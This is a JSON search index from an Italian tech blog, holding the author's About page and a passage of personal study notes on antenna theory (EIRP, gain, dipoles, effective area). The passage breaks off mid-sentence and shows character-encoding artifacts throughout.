[{"categories":null,"contents":"Mi chiamo Lombardi Angelo Nunzio, in arte, k0Br@3390 e questo Ã¨ SpaceHack, il mio blog. Su di esso troverai contenuti di informatica, programmazione e cyber security. Questo spazio serve a me come valvola di sfogo nel parlare a chi Ã¨ davvero interessato a questo mondo e a coloro che sono interessati davvero a questo mondo come il sottoscritto. Detto questo, happy coding e sopratutto, happy hacking ðŸ‘½.\n[ Github ]\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/about/","tags":null,"title":"About"},{"categories":["Tutorial"],"contents":"Table of Contents  Appunti sulle Antenne Propagazione delle onde elettromagnetiche nello spazio libero  IntensitÃ¡ del campo elettromagnetico prodotto da unâ€™antenna isotropica  Cosâ€™Ã© la densitÃ¡ di potenza Cosâ€™Ã© intesitÃ¡ del campo elettrico   EIRP e calcolo del campo elettromagnetico prodotto da unâ€™antenna non isotropica  Calcolo dellâ€™EIRP Calcolo del campo elettromagnetico prodotto da unâ€™antenna reale     Le Antenne  Teorema di ReciprocitÃ¡ Componenti di un sistema di antenna   Diagramma di radiazione e solido di radiazione Guadagno di unâ€™antenna  Guadagno rispetto allâ€™antenna isotropica Guadagno rispetto allâ€™antenna al dipolo in Î»/2   Principali tipi di antenne  Principio di funzionamento delle antenne lineari Banda di unâ€™antenna lineare Resistenza dâ€™antenna  Resistenza di radiazione Resistenza di dissipazione   Parametri tipi di delle antenne riceventi  Altezza efficace Fattore di traduzione da campo elettrico indicente Area equivalente Correlazione tra Dimensioni dellâ€™antenna e lâ€™area equivalente Fattore di trasduzione da densitÃ¡ di potenza incidente     Antenne omnidirezionali  Dipolo in Î»/2 Antenna Marconi Antenna Ground Plane Antenne Caricate Dipolo ripiegato (folded dipole) e antenne a banda larga   Antenne direttive  Angolo di apertura del fascio (beamwidth) o angolo di radiazione Front-to-Back Ratio (rapporto avanti/dietro) Antenna Yagi Antenna collineari e a cortina Puntamento delle antenne direttive   Antenne a superficie  Antenna parabolica Parabola offset Antenne paraboliche per la ricezione TV da satellite Parabola Cassegrain   Sistemi di antenna MIMO(Multiple In Multiple Out) Installazione dei sistemi di antenna  Orizzonte radio e massima distanza fra due antenne Perdite per diffrazione e prima zona di Fresnel   Dimensionamento di un collegamento radio  Bilancio di potenza (link budget) di un collegamento radio Calcolo del livello in ricezione   Fading delle Antenne   In questo blog non vorrei parlare delle discipline come informatica, sicurezza informatica, ma col tempo vorrei trattare anche tematiche che riguardano il mio indirizzo di studi, ossia telecomunicazioni. Col tempo verranno mostrati e trattati argomenti di telecomunicazioni ed elettronica.\nOggi parliamo delle antenne, qui di seguito sono riportati dei miei personali appunti, buona lettura.\n Propagazione delle onde elettromagnetiche nello spazio libero I parametri con cui si valuta lâ€™entitÃ¡ del campo elettromagnetico sono:\n DensitÃ¡ di potenza \\(S\\) , che si misura in \\(w / m^2\\) IntensitÃ¡ del campo elettrico \\(E\\), che si misura in \\(V / m\\)  In particolare, si deve garantire che sullâ€™antenna ricevente si abbia un valore di campo elettromagnetico tale da ottenere in ingresso al ricevitore un segnale che abbia un livello di potenza pari alla sensibilitÃ¡ del ricevitore.\nLa sensibilitÃ¡ del ricevitore (in inglese sensitivity) Ã© definita come il minimo livello di potenza del segnale in ingresso al ricevitore che consente di fornire in uscita un segnale di qualitÃ¡ accettabile.\nI valori del campo elettromagnetico dipendono da fattori come:\n Potenza del segnale fornito in ingresso allâ€™antenna trasmittente Tipo di antenna trasmittente Distanza fra antenna trasmittente e ricevente Ambiente in cui avviene la propagazione delle onde elettromagnetiche  Altri due concetti importanti per lo studio dellâ€™entitÃ¡ del campo elettromagnetico sono: lâ€™antenna isotropica e lo spazio libero.\nUnâ€™antenna isotropica ideale Ã© un antenna che irradia uniformemente in tutte le direzioni dello spazio e non causa dissipazione, dunque: \\(P_{IRR} = P_{IN}\\).\nLo spazio libero Ã© una regione dello spazio assimilabile al vuoto, questo spazio Ã© un mezzo isotropo in cui le onde elettromagnetiche viaggiano in linea retta alla velocitÃ¡ della luce, ossia a:\n$$ \\Large\\textsf{} c \\approx 3 * 10^8 \\space \\dfrac{m}{s} $$\nNello spazio libero lâ€™intensitÃ¡ del campo elettrico \\(E\\), lâ€™intensitÃ¡ del campo magnetico \\(H\\) e la densitÃ¡ di potenza \\(S\\) possono essere considerati come tensione, corrente e potenza di un circuito elettrico.\nEcco una tabella che chiarisce le associazioni dei valori nello spazio libero e in un circuito elettrico:\n   Valori nello Spazio Libero  Valori in un Circuito Elettrico     IntensitÃ¡ del campo elettrico E = Tensione V   IntesitÃ¡ del campo magnetico H = Corrente I   DensitÃ¡ di potenza S = Potenza P    Inoltre lo spazio libero Ã© considerabile come un mezzo trasmissivo avente impedenza caratteristica:\n$$ \\Large\\textsf{} Z_0 = 120 \\pi \\space \\approx \\space 377Î© $$\nÃ‰ possibile estendere le leggi fondamentali dellâ€™elettrotecnica per determinare i legami fra \\(E\\), \\(H\\), \\(S\\). Avendo fatto in precedenza quelle associazioni tra i valori del campo elettromagnetico e grandezze elettriche possiamo definire le seguenti relazioni:\n$$ \\Large\\textsf{} E = Z_0 * H; \\space\\space S = E * H; \\space\\space Z_0 = \\dfrac{E}{H}; $$\nDa questi si possono definire i seguenti legami tra campo elettrico \\(E\\) e densitÃ¡ di potenza:\n$$ \\Large\\textsf{} S = \\dfrac{E^2}{Z_0} \\implies S = \\dfrac{E^2}{120 * \\pi} [ \\space W / m^2 \\space] E = \\sqrt{S * Z_0} \\implies E = \\sqrt{S * 120 * \\pi} \\space\\space [\\space V / m \\space] $$\n IntensitÃ¡ del campo elettromagnetico prodotto da unâ€™antenna isotropica Lo studio della determinazione del campo elettromagnetico nel caso di un antenna isotropica posta nello spazio libero Ã© di particolare importanza in quanto le formule ricavate possono essere riutilizzate per una valutazione del campo elettromagnetico in un ambiente reale.\nPensiamo dunque al caso ideale di unâ€™antenna trasmittente isotropica posta nello spazio libero. Allâ€™antenna viene fornita in ingresso una certa potenza di segnale \\(P_{IN}\\), che viene totalmente irradiata in modo uniforme in tutte le direzioni, si ha dunque \\(P_{IN_ISO} = P_{IRR_ISO}\\).\n Cosâ€™Ã© la densitÃ¡ di potenza Un generatore a radiofrequenza connesso a unâ€™antenna isotropica, posta nello spazio libero, genererebbe onde elettromagnetiche i cui fronti dâ€™onda sono costituiti da superfici sferiche, in quanto lâ€™irradiazione Ã© uniforme in tutte le direzioni e non si hanno nÃ© ostacoli nÃ© eterogeneitÃ¡.\nLa densitÃ¡ di potenza Ã© data dalla potenza per unitÃ¡ di area:\n$$ \\Large\\textsf{} S = \\dfrac{P_{IRR_ISO}}{4\\pi * r^2} \\space\\space [\\space \\dfrac{W}{m^2} \\space] $$\ndove:\n \\(S \\space(W / m^2):\\) densitÃ¡ di potenza a distanza $r$ dallâ€™antenna isotropica ideale; \\(P_{IRR_ISO} \\space (W):\\) potenza irradiata in modo isotropico, pari alla potenza di ingresso nel caso di antenna isotropica ideale; \\(r(m):\\) distanza fra lâ€™antenna isotropica e il punto in cui si valuta la densitÃ¡ di potenza   Cosâ€™Ã© intesitÃ¡ del campo elettrico Il valore efficace dellâ€™intensitÃ¡ del campo elettrico \\(E\\), si puÃ³ calcolare con la relazione:\n$$ \\Large\\textsf{} E = \\dfrac{1}{r} \\space \\sqrt{30 * P_{IRR_ISO_[w]}} \\space [\\space V/m\\space] $$\nEcco unâ€™immagine del campo elettromagnetico generato da unâ€™antenna isotropica:\n EIRP e calcolo del campo elettromagnetico prodotto da unâ€™antenna non isotropica Lâ€™EIRP (Effective Isotropic Radiated Power) Ã© definito come il livello di potenza, espresso in dBW o dBm fornito in ingresso a unâ€™antenna isotropica per fornire lo stesso campo elettromagnetico prodotto dallâ€™antenna reale:\n$$ \\Large\\textsf{} EIRP = 10 \\log_{10}(P_{IN_ISO}) = 10 \\log_{10}(P_{IRR_ISO}) $$\nIn altre parole dunque, lâ€™EIRP descrivere la potenza totale irradiata da un\u0026rsquo;antenna in una determinata direzione, rispetto alla potenza che sarebbe irradiata se l\u0026rsquo;antenna fosse una sorgente isotropica ideale che irradia uniformemente in tutte le direzioni.\nL\u0026rsquo;EIRP tiene conto della potenza di trasmissione dell\u0026rsquo;antenna e della direzionalitÃ  del diagramma di radiazione dell\u0026rsquo;antenna stessa e tiene conto del fatto che un\u0026rsquo;antenna non irradia uniformemente in tutte le direzioni ma concentra la potenza in determinate direzioni. Infine lâ€™EIRP viene utilizzata per rappresentare una misura della capacitÃ  dell\u0026rsquo;antenna di trasmettere segnali a lunghe distanze.\n Calcolo dellâ€™EIRP In precedenza abbiamo visto la formula generica per il calcolo dellâ€™EIRP, ma esiste anche unâ€™altra circostanza nella quale va calcolato. Si consideri lo schema di un sistema di trasmissione radio reale che comprenda:\n Un trasmettitore con un segnale che ha una certa potenza \\(P_{TX} (W)\\) e un livello di potenza \\(L_{PTX} = 10\\log(P_{TX_[W]})\\) dBW. Un cavo che collega il trasmettitore allâ€™antenna con unâ€™attenuazione \\(A_F(dB)\\) Unâ€™antenna trasmittente con un guadagno \\(G_{ant} (dB)\\)  Lâ€™EIRP viene calcolato utilizzando i decibel:\n$$ \\Large\\textsf{} EIRP = L_{PTX_[dBW]} \\space-\\space A_{F_[dB]} \\space+\\space G_{ant_[dB]} \\space[dBW] $$\nNoto lâ€™EIRP Ã© possibile calcolare la potenza equivalente che dovrebbe irradiare unâ€™antenna isotropica per produrre lo stesso campo elettromagnetico che produce lâ€™antenna reale:\n$$ \\Large\\textsf{} P_{IRR_ISO} = 10^{EIRP/10} \\space [W] $$\n Calcolo del campo elettromagnetico prodotto da unâ€™antenna reale Nel caso di antenna reale i valori di densitÃ¡ di potenza (\\(S\\) e di campo elettrico (\\(E\\) possono essere calcolati con il seguente procedimento:\n Si calcola lâ€™EIRP. Si calcola la potenza equivalente irradiata isotropicamente. Si calcolano i valori di \\(S\\) ed \\(E\\) con la formula:  $$ \\Large\\textsf{} S = \\dfrac{P_{IRR_ISO}}{4\\pi * r^2} \\space[W/m^2]; \\space\\space E = \\dfrac{1}{r} * \\sqrt{30 * {P_{IRR_ISO}}}\\space[W/m]; $$\nIl calcolo del campo elettromagnetico in un sistema trasmittente via radio viene effettuato per due motivi:\n Verificare che la sua intensitÃ¡ sia tale da fornite al ricevitore un segnale avente un livello di potenza sufficiente Verificare che il campo elettrico \\(E\\) misurato e la densitÃ¡ di potenza \\(S\\) non debbano superare i seguenti valori:  $$ \\Large\\textsf{} E_{MAX} \\leq 6 \\space V/m, \\space\\space per \\space\\space 100kHz \\leq f \\leq 300 GHz \\newline S_{MAX} \\leq 0,1 \\space W/m^2, \\space\\space per \\space\\space 3MHz \\leq f \\leq 300 GHz $$\n Le Antenne Lâ€™antenna Ã© lâ€™ultimo elemento di un sistema di trasmissione via radio. Essa riceve un segnale da un trasmettitore il quale imprime su un segnale a radiofrequenza (RF) le informazioni da trasmettere via radio.\nLâ€™uscira dellâ€™amplificatore di potenza Ã© un segnale in corrente avente frequenza adatta alla trasmissione via radio e potenza sufficiente a garantire una corretta ricezione.\nDunque possiamo dire che: Unâ€™antenna Ã© definita come un trasduttore che in trasmissione converte un segnale elettrico a radiofrequenza in onde elettromagnetiche irradiate nelle direzioni desiderate, mentre in ricezione converte in modo efficiente le onde elettromagneitche in un segnale elettrico a RF.\nPossiamo avere molti tipi di trasmissione radio:\n Radiodiffusione AM ed FM TV Ponti Radio Sistemi cellulari  e i requisiti richiesti per le antenne possono essere diversi. Per esempio la radiodiffusione lâ€™antenna trasmittente Ã© omnidirezionale sul piano orizzontale per poter raggiungere tutti gli utenti, mentre per un collegamento in ponte radio si richiede che lâ€™antenna sia estremamente direttiva cosÃ­ da limitare la potenza necessaria per trasmettere.\nPer le antenne vale il principio di reciprocitÃ¡ che afferma: le proprietÃ¡ di unâ€™antenna rimangono le stesse sia che essa venga usata come antenna trasmittente sia che ricevente.\n Teorema di ReciprocitÃ¡ Il teorema di reciprocitÃ  nelle antenne di telecomunicazione Ã¨ un principio fondamentale che riguarda la simmetria e l\u0026rsquo;omogeneitÃ  del mezzo di propagazione delle onde elettromagnetiche. In parole semplici, questo teorema afferma che le caratteristiche di trasmissione e di ricezione di un\u0026rsquo;antenna sono identiche quando viene utilizzata come trasmettitore e come ricevitore.\nIn altre parole, se un\u0026rsquo;antenna trasmette un segnale in una determinata direzione e successivamente viene utilizzata per ricevere un segnale nella stessa direzione, le sue proprietÃ  di ricezione saranno le stesse che se fosse stata progettata specificamente per ricevere il segnale in questione. Questo significa che le antenne possono essere utilizzate per la trasmissione e la ricezione di segnali senza necessitÃ  di modifiche significative alla loro struttura o alla loro geometria.\nIl teorema di reciprocitÃ  si applica a tutte le antenne che soddisfano determinate condizioni di simmetria e linearitÃ . In particolare, si applica alle antenne a filo, alle antenne a dipolo, alle antenne a cornetta, alle antenne a riflettore parabolico e alle antenne a schiera. In genere, tutte le antenne che presentano un\u0026rsquo;impedenza di radiazione costante e omogenea in tutte le direzioni sono compatibili con il teorema di reciprocitÃ .\nL\u0026rsquo;importanza del teorema di reciprocitÃ  sta nella sua applicazione pratica. Ad esempio, quando si progetta un sistema di telecomunicazioni, spesso si utilizzano antenne diverse per la trasmissione e la ricezione dei segnali. Tuttavia, grazie al teorema di reciprocitÃ , Ã¨ possibile utilizzare la stessa antenna sia per trasmettere che per ricevere il segnale, semplificando notevolmente il progetto del sistema e riducendo i costi.\nInoltre, il teorema di reciprocitÃ  puÃ² essere utilizzato per calcolare l\u0026rsquo;efficienza di una antenna quando viene utilizzata come ricevitore, poichÃ© l\u0026rsquo;efficienza di trasmissione e di ricezione sono uguali. Questo puÃ² essere utile per determinare la capacitÃ  di una antenna di ricevere un segnale in presenza di rumore o interferenze.\nIn sintesi, il teorema di reciprocitÃ  Ã¨ un principio fondamentale delle antenne di telecomunicazione che permette di semplificare il progetto dei sistemi di comunicazione e di calcolare l\u0026rsquo;efficienza delle antenne quando vengono utilizzate come ricevitori.\n Componenti di un sistema di antenna Un impianto di trasmissione e/o ricezione via radio comprende un sistema di antenna, il quale puÃ³ essere costituito dai seguenti elementi:\n Antenna: Ã© lâ€™elemento irradiante o ricevente, puÃ³ essere montata su una torre (che prende il nome di traliccio o palo) al fine di garantire la copertura radio alla distanza massima prevista per il sistema di comunicazione via radio. Linea di trasmissione (feeder dâ€™antenna): Ã© utilizzata per collegare il trasmettitore (o il ricevitore) con lâ€™antenna. Ha lo scopo di trasferire il segnale dal trasmettitore allâ€™antenna con la minima attenuazione possibile. Dispositivo di adattamento: consente di riprisitnare lâ€™adattamento fra linea e antenna nel caso in cui lâ€™impedenza dellâ€™antenna non si auguale allâ€™impedenza caratteristica della linea. Dispositivo di separazione TX-RX (duplexer o circolatore): Ã© utilizzato per separare i sensi di trasmissione (TX) e ricezione (RX) nel caso in cui si utilizzi la stessa antenna sia per trasmettere sia per ricevere. Dispositivi ausiliari: sono necessari nei grandi impianti per segnalare la presenza dellâ€™antenna, per la protezione contro il ghiaccio, il vento e lâ€™acqua, per il puntamento dellâ€™antenna nel caso di antenne direttive.   Diagramma di radiazione e solido di radiazione Per rappresentare le direzioni preferenziali in cui irradia unâ€™antenna si utilizza un diagramma di radiazione (radiation pattern).\nUn antenna reale, non irradia in modo uniforme in tutte le direzioni dello spazio. Questo diagramma mette bene in evidenza lâ€™attitudine che ha una sorgente a concetrare la potenza in certe direzioni e quindi ne evidenzia il grado di direttivitÃ :\nIl diagramma di radiazione Ã¨ una curva, riportata di solito su un diagramma polare con al centro lâ€™antenna, che rappresenta come la potenza fornita in ingresso allâ€™antenna viene distribuita nella varie direzione del piano considerato.\nIl diagramma di radiazione puÃ² riportare i valori del guadagno che lâ€™antenna presenta nelle varie direzioni del piano considerato, espressi in decibel.\nNormalmente si tracciano i diagrammi di radiazione in due piani tra loro ortogonali denominati:\n Piano verticale o piano E: Ã¨ il piano in cui giace il vettore campo elettrico E ed Ã¨ anche il piano su cui giace unâ€™antenna lineare; Piano orizzontale o piano H: Ã¨ il piano in cui giace il vettore campo magnetico H ed Ã¨ anche il piano che taglia ortogonalmente lâ€™antenna;  A seconda di come Ã¨ fatto il diagramma di radiazione in un determinato piano, unâ€™antenna viene definita:\n Omnidirezionale: se il diagramma di radiazione in quel piano Ã¨ allâ€™incirca un cerchio lâ€™antenna irradia uniformemente in tutte le direzioni; Direttiva: se il diagramma di radiazione in quel piano presenta delle direzioni prefenziali di irraggiamento Direttiva unidirezionale: se il diagramma di radiazione mostra una direzione preferenziale di irragiamento, quella anteriore data dal lobo principale del diagramma. Altre direzioni di minore irraggiamento, non desiderate, definite dai lobi secondari del diagramma di radiazione.   Guadagno di unâ€™antenna Il guadagno di unâ€™antenna Ã¨ un parametro che mette in evidenza quanto unâ€™antenna puÃ² concentrare la potenza in una certa direzione rispetto a unâ€™antenna di riferimento. Il guadagno di unâ€™antenna Ã¨ direttiva tanto piÃ¹ alto Ã¨ il suo guadagno.\nA seconda dellâ€™impiego si possono avere due antenne di riferimento:\n Antenna isotropa: unâ€™antenna puramente ideale, che irradia in modo uniforme in tutte le direzioni. Dipolo in \\(\\lambda /2\\): viene utilizzata come riferimento per le antenne lineari, in particolare nel settore delle antenne riceveneti TV.   Guadagno rispetto allâ€™antenna isotropica Il guadagno di unâ€™antenna puÃ² essere definito come il rapporto fra la potenza che Ã¨ necessaria dare in ingresso a unâ€™antenna isotropica ideale Ã¨ la potenza che Ã¨ necessario fornire al connettore dellâ€™antenna in esame.\nIl guadagno rispetto allâ€™antenna isotropica si calcola come:\n$$ \\Large\\textsf{} G = 10\\log_{10} \\space \\dfrac{P_{ISO}}{P_{IN}} \\space [dBi] $$\nIl guadagno viene espresso in \\(dBi\\) per indicare che Ã¨ stato ottenuto prendendo come riferimento lâ€™antenna isotropica ideale (i = isotropica).\nIl guadagno di unâ€™antenna esprime lâ€™aumento della potenza irradiata che si ottiene concentrando la potenza in certe direzioni.\nIl valore del guadagno nelle altre direzioni, denominato guadagno direttivo, puÃ² essere fornito tramite un diagramma di radiazione in cui si riporta il guadagno per i diversi angoli.\nQuando il guadagno viene espresso semplicemente in \\(dB\\) risulta sottointeso che lâ€™antenna di riferimento Ã¨ quella isotropa anche se non si mette.\nNoto il guadagno Ã¨ possibile calcolare il livello con cui dovrebbe irradiare unâ€™antenna per produrre lo stesso campo dellâ€™antenna in considerazione:\n$$ \\Large\\textsf{} G_{[dB]} = 10\\log_{10} \\space P_{ISO} - 10\\log_{10} \\space P_{IN} = EIRP - L_{P_IN} $$\nDa cui si ottiene la seguente formula inversa:\n$$ \\Large\\textsf{} EIRP = L_{P_IN} \\space + \\space G_{dB} $$\nSe non Ã¨ noto il livello di potenza in ingresso allâ€™antenna ( \\(L_{P_IN}\\) ), Ã¨ possibile calcolarlo in funzione del livello di potenza del trasmettitore ( \\(L_{P_TX}\\) ) e dellâ€™attenuazione della linea (feeder, \\(A_F\\)) come:\n$$ \\Large\\textsf{} L_{P_IN} = L_{P_TX} - A_F $$\nLa direttivitÃ¡ \\(D\\) il rapporto tra la potenza che dovrebbe irradiare unâ€™antenna isotropica ( \\(P_{ISO}\\) ) e la potenza irradiata ( \\(P_{IRR}\\) ) dallâ€™antenna in esame affinche il campo da loro prodotto sia lo stesso:\n$$ \\Large\\textsf{} D = 10\\log_{10} \\space \\dfrac{P_{ISO}}{P_{IRR}} \\space [dBi] $$\nIl guadagno effettivo (\\(G\\)), detto anche guadagno di potenza, Ã© minore della direttivitÃ¡ (\\(G \u0026lt; D\\)) a causa del fatto che unâ€™antenna reale causa una piccola dissipazione di potenza, per cui la potenza irradiata Ã© inferiore rispetto alla potenza in ingresso.\n Guadagno rispetto allâ€™antenna al dipolo in Î»/2 Il guadagno viene espresso in \\(dBd\\) quando si prende come antenna di riferimento il dipolo \\(\\lambda/2\\), il pedice $d$ sta proprio a indicare che si Ã© presa come antenna di riferimento il dipolo in \\(\\lambda/2\\).\n Principali tipi di antenne Ãˆ possibile identificare due categorie principali:\n  Antenne lineari: esse sono omnidirezionali a banda larga, direttive;\n  Antenna a dipolo: un dipolo Ã¨ un\u0026rsquo;antenna costituita da due elementi conduttori che sono allineati elettricamente, ma con polaritÃ  opposta. Il dipolo Ã¨ un\u0026rsquo;antenna molto comune e puÃ² essere utilizzato in molte applicazioni wireless, come le trasmissioni radio e televisive.\nIl dipolo Ã¨ solitamente costituito da un filo metallico sottile che viene tagliato a una lunghezza specifica in base alla frequenza di trasmissione desiderata. Quando il dipolo viene alimentato con un segnale di frequenza corrispondente alla sua lunghezza, le correnti elettriche fluiscono attraverso i suoi elementi, creando un campo elettromagnetico che si irradia nell\u0026rsquo;ambiente circostante.\nIl dipolo Ã¨ una delle antenne piÃ¹ semplici e convenienti da costruire, ed Ã¨ spesso utilizzato come riferimento per la valutazione di altre antenne piÃ¹ complesse. Il dipolo puÃ² anche essere utilizzato in combinazione con altri elementi per creare antenne piÃ¹ direzionali o per migliorare le prestazioni in determinate direzioni.\n    Antenne a superficie: esse sono antenne direttive con alto guadagno; tra esse la piÃ¹ diffusa Ã¨ lâ€™antenna a parabola;\n   Principio di funzionamento delle antenne lineari Consideriamo un tronco di linea bifilare con terminazione aperta alimentato da un generatore a radiofrequenza ($RF$). Su di esso si viene ad instaurare un regime di onde stazionarie di corrente e tensione. Questa linea irradia poco per due motivi:\n I due conduttori sono vicini e per questo motivio lâ€™irradiazione di uno di essi cancella quella dellâ€™altro. Se si considera lo spazio come un carico esso risulta fortemente disadattato e cosÃ¬ si ha poco trasferimento di potenza a essa.  Se perÃ² si piegano a $90\\degree$gradi le estremitÃ  della linea, le correnti avranno lo stesso verso in questo tratto e sarÃ  quindi possibile irradiare energia nello spazio in modo efficiente. In questo modo si ottiene un antenna denominata antenna a dipolo o antenna Hertziana.\nDunque in sintesi: Se si vuole massimizzare lâ€™irradiazione Ã¨ necessario piegare i coduttori a una distanza \\(\\lambda/4\\) dallâ€™estremitÃ  ottenendo cosÃ¬ unâ€™antenna lunga \\(\\lambda/2\\), denominata per questo dipolo \\(\\lambda/2\\) o dipolo a mezzâ€™onda.\nIl dipolo \\(\\lambda/2\\) , ha un comportamento simile a quello di un tronco di linea in \\(\\lambda/4\\); lâ€™onda stazionaria di corrente presenta un minimo alle estremitÃ , mentre Ã¨ massimo al centro.\n Banda di unâ€™antenna lineare Unâ€™antenna lineare, a dipolo, ha un comportamento analogo a quello di un circuito risonante.\nLa banda (\\(B\\)) di unâ€™antenna puÃ² essere defnita come lâ€™intervallo di frequenza entro cui il ROS si mantiene entro dei limiti. Tipicamente i valori limite di ROS sono compresi tra \\(1,5\\) e \\(2\\).\nLa banda di una antenna Ã¨ in pratica lâ€™intervallo di frequenza in cui il diagramma di radiazione dellâ€™antenna fornisce le prestazioni richieste.\nLa banda dipende dal diametro del conduttore con il quale si realizza lâ€™antenna.\n Resistenza dâ€™antenna Unâ€™antenna rappresenta per la linea (feeder) un carico che Ã© resistivo in risonanza e viene denominato resistenza dâ€™antenna ( \\(R_a\\) ). La resistenza dâ€™antenna viene considerata come la somma di due resistenze:\n La resistenza di radiazione ( \\(R_r\\) ) La resistenza di dissipazione (\\( R_d\\) )  $$ \\Large\\textsf{} R_a \\space = \\space R_r \\space + \\space R_d \\space [Î©] $$\n Resistenza di radiazione La resistenza di radiazione Ã© definita come il rapporto tra la potenza irradiata dallâ€™antenna ( \\(P_{IRR}\\) ) e il quadrato della corrente ( \\(I_{IN}\\) ) che giunge in ingresso allâ€™antenna (punto di alimentazione):\n$$ \\Large\\textsf{} R_r = \\dfrac{P_{IRR}}{I^2_{IN}} \\space [Î©] $$\nLa resistenza di radiazione Ã© quella resistenza che dissipa una potenza pari a quella irradiata dallâ€™antenna. Per un dipolo la \\(R_r\\) dipende da diversi fattori, tra i quali:\n Diametro del conduttore: la \\(R_r\\) aumenta al diminuire del diametro del coduttore Altezza dal suolo: alla quale si pone lâ€™antenna; le onde elettromagnetiche emesse dallâ€™antenna possono venire riflesse dalla terra ed indurre una corrente nellâ€™antenna. A seconda della distanza percorsa varia la fase della corrente indotta e quindi varia la corrente totale. Si modifica percÃ­o anche la resistenza di radiazione   Resistenza di dissipazione La resistenza di dissipazione tiene conto della perdita di potenza che si puÃ³ avere sullâ€™antenna. Per valutare le perdite sullâ€™antenna si definie il rendimento ( \\(\\eta\\) ) dato dal rapporto fra la potenza irradiata ( \\(P_{IRR}\\) ) e la potenza in ingresso allâ€™antenna ( \\(P_{IN}\\) ):\n$$ \\Large\\textsf{}\\eta = \\dfrac{P_{IRR}}{P_{IN}} = \\dfrac{R_r}{R_r + R_d} $$\n Parametri tipi di delle antenne riceventi In risonanza unâ€™antenna ricevente puÃ³ essere considerata come un generatore avente resistenza interna \\(R_a\\), in grado di erogare una certa tensione e una certa potenza a un carico \\(R_u\\):\nSupponendo che lâ€™antenna sia adattata e correttamente orientata, la tensione e la potenza che essa Ã© in grado di erogare dipendono da due parametri di traduzione, ossia:\n Lâ€™altezza efficace ( \\(h\\) ) Lâ€™area equivalente ( \\(A_{eq} \\))   Altezza efficace L\u0026rsquo;altezza efficace \\(h_e\\) Ã¨ un termine utilizzato in telecomunicazioni per descrivere l\u0026rsquo;altezza a cui un\u0026rsquo;antenna appare \u0026ldquo;efficace\u0026rdquo; nel trasferimento di segnali radio. In particolare, si riferisce all\u0026rsquo;altezza a cui un\u0026rsquo;antenna sembra essere vista dall\u0026rsquo;altro lato della comunicazione.\nInoltre, l\u0026rsquo;altezza efficace di un\u0026rsquo;antenna dipende da diversi fattori, tra cui l\u0026rsquo;altezza fisica dell\u0026rsquo;antenna, la frequenza del segnale trasmesso, la presenza di ostacoli o interferenze nell\u0026rsquo;ambiente circostante e la potenza di trasmissione dell\u0026rsquo;antenna.\nFattore di traduzione da campo elettrico indicente ( \\(E \\space V/m\\) ) a tensione dâ€™uscita ( \\(RMS\\) ) a vuoto, \\(V_g \\space (V)\\):\n$$ \\Large\\textsf{}V_g = h_e * E $$\nPoiche \\(E\\) si esprime in \\(V/m\\), mentre \\(V_g\\) Ã© in \\(V\\), \\(h_e\\) si esprime in mentri. Per le antenna a dipolo lâ€™altezza efficace si puÃ³ calcolare come:\n$$ \\Large\\textsf{}h_e = \\lambda\\sqrt{\\dfrac{R_r * G}{\\pi * Z_0}} \\space [m] $$\nDove:\n \\(R_r\\): resistenza di radiazione; \\(G\\): guadagno dellâ€™antenna non in db; \\(Z_0 = 120 \\pi\\): impedenza caratteristica dello spazio libero; \\(\\lambda\\): lunghezza dâ€™onda dellâ€™onda elettromagnetica indicente;   Fattore di traduzione da campo elettrico indicente Il fattore di traduzione da campo elettrico, noto anche come coefficiente di accoppiamento o fattore di accoppiamento, Ã¨ un parametro che indica la quantitÃ  di energia elettromagnetica trasmessa da un\u0026rsquo;antenna trasmittente ad un\u0026rsquo;antenna ricevente.\nIn particolare, il fattore di traduzione da campo elettrico misura la frazione del campo elettrico irradiato dalla prima antenna che viene ricevuta efficacemente dalla seconda antenna, tenendo conto delle caratteristiche geometriche e di orientamento delle due antenne, della distanza tra di esse e delle proprietÃ  del mezzo di propagazione.\nIn pratica, il fattore di traduzione da campo elettrico Ã¨ un parametro importante per la progettazione e l\u0026rsquo;ottimizzazione delle antenne, poichÃ© consente di valutare l\u0026rsquo;efficacia di un\u0026rsquo;antenna trasmittente nel trasferire energia ad un\u0026rsquo;altra antenna ricevente.\n Area equivalente L\u0026rsquo;area equivalente \\(A_{eq}\\) Ã¨ una misura dell\u0026rsquo;efficienza dell\u0026rsquo;antenna e rappresenta l\u0026rsquo;area che l\u0026rsquo;antenna sembra occupare nell\u0026rsquo;ambiente circostante in termini di capacitÃ  di ricezione o trasmissione del segnale radio.\nFattore di trasduzione da densitÃ¡ di potenza incidente (\\(S\\)) a potenza fornita al carico adattato ( \\(P_u\\) ):\n$$ \\Large\\textsf{}P_u = S * A_q \\space [W] $$\nPoichÃ© $S$ si esprime in \\(W/m^2\\), mentre \\(P\\) Ã© in \\(W\\), dimensionalmente \\(A_{eq}\\) si esprime in \\(m^2\\).\nLâ€™area equivalente (\\( A_{eq}\\) ) di unâ€™antenna si calcome come:\n$$ \\Large\\textsf{}A_{eq} = G \\space\\dfrac{\\lambda^2}{4\\pi} \\space [m^2] $$\nDove:\n \\(G\\): guadagno dellâ€™antenna non in dB; \\( \\lambda \\): lunghezza dâ€™onda dellâ€™onda elettromagnetica indicente   Correlazione tra Dimensioni dellâ€™antenna e lâ€™area equivalente La dimensione di un\u0026rsquo;antenna si riferisce alle sue caratteristiche fisiche, come la lunghezza, il diametro, l\u0026rsquo;altezza e l\u0026rsquo;area di apertura. La dimensione dell\u0026rsquo;antenna Ã¨ importante perchÃ© determina le sue proprietÃ  elettriche, come l\u0026rsquo;impedenza, la direttivitÃ , la polarizzazione e la larghezza di banda. In generale, le antenne piÃ¹ grandi hanno una maggiore direttivitÃ  e una maggiore efficienza rispetto alle antenne piÃ¹ piccole, ma possono essere piÃ¹ costose e difficili da installare. Tuttavia, le dimensioni dell\u0026rsquo;antenna dipendono dalle specifiche esigenze di trasmissione e ricezione del sistema di telecomunicazioni in cui viene utilizzata. In telecomunicazioni, l\u0026rsquo;area equivalente di un\u0026rsquo;antenna Ã¨ una misura del suo potere di ricezione o trasmissione, in relazione alla sua area fisica. Essa Ã¨ definita come l\u0026rsquo;area di un\u0026rsquo;antenna ideale che ha lo stesso potere di ricezione o trasmissione dell\u0026rsquo;antenna reale.\nLa dimensione dell\u0026rsquo;antenna Ã¨ strettamente correlata all\u0026rsquo;area equivalente dell\u0026rsquo;antenna. In generale, le antenne piÃ¹ grandi hanno un\u0026rsquo;area equivalente maggiore rispetto alle antenne piÃ¹ piccole. CiÃ² significa che le antenne piÃ¹ grandi possono trasmettere o ricevere segnali piÃ¹ potenti rispetto alle antenne piÃ¹ piccole, a 